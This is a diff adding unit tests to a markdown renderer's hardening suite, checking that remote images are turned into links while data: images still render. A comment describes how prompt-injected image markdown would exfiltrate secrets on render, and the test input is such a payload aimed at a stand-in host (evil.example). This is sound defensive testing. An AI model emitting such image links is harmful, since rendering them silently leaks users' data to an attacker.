@@ -132,4 +132,18 @@ describe('marked raw-HTML hardening', () => {
         expect(out).toContain('&lt;b&gt;');
         expect(out).not.toContain('&amp;lt;');
     });
+
+    it('does not auto-load remote markdown images', () => {
+        // A prompt-injected ![](https://evil/?d=secret) would exfiltrate on
+        // render; it must become a link, never an <img>.
+        const out = marked.parse('![chart](https://evil.example/p.png?d=secret)');
+        expect(out).not.toMatch(/<img\s/i);
+        expect(out).toContain('href="https://evil.example/p.png?d=secret"');
+        expect(out).toContain('chart (evil.example)');
+    });
+
+    it('still renders data: image URLs inline', () => {
+        const out = marked.parse('![dot](data:image/png;base64,iVBORw0KGgo=)');
+        expect(out).toMatch(/<img\s[^>]*src="data:image\/png/i);
+    });
 });
